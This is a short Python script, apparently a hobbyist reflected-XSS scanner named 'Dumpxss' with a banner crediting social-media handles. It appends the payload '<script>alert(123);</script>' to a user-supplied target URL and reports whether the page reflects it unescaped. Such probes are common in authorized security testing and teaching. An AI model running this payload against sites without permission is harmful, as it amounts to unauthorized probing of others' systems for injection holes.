import requests
import threading
from colorama import Fore, Back, Style


print(
        Fore.YELLOW +
         """
________                                             
\______ \  __ __  _____ _________  ___  ______ ______
 |    |  \|  |  \/     \\____ \  \/  / /  ___//  ___/
 |    `   \  |  /  Y Y  \  |_> >    <  \___ \ \___ \ 
/_______  /____/|__|_|  /   __/__/\_ \/____  >____  >
        \/            \/|__|        \/     \/     \/ 
                                          [ twitter.com/r00t_nasser ]
                                          [ Snapchat : aaa.saq ]
        """ + Fore.RESET)

url = input("Please Enter Target Url = ")
payload = "<script>alert(123);</script>"
req=requests.get(url+payload,"html.parser").text;
print(url+payload)
if payload in req:
    print(Fore.GREEN +'XSS Found   -->','   ' , f"{url+payload}" + Fore.RESET)
else:
    print(Fore.RED + 'XSS Not Found' + Fore.RESET)
